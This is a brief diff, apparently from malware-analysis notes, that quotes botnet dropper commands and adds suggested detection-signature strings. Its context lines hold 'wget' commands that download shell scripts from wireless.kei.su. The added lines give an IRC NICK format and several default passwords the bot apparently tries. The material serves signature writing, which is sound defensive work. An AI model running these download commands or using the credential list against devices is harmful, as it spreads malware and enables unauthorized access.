@@ -56,3 +56,13 @@ busybox wget http://wireless.kei.su//bbsh
 wget http://wireless.kei.su/wgsh
 
 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+signature suggestion: you can use the following string in writing signature
+===============================
+NICK [%s|%s|%s|%s|%s]
+admin007
+admin69
+nimda
+toor
+lilly
+
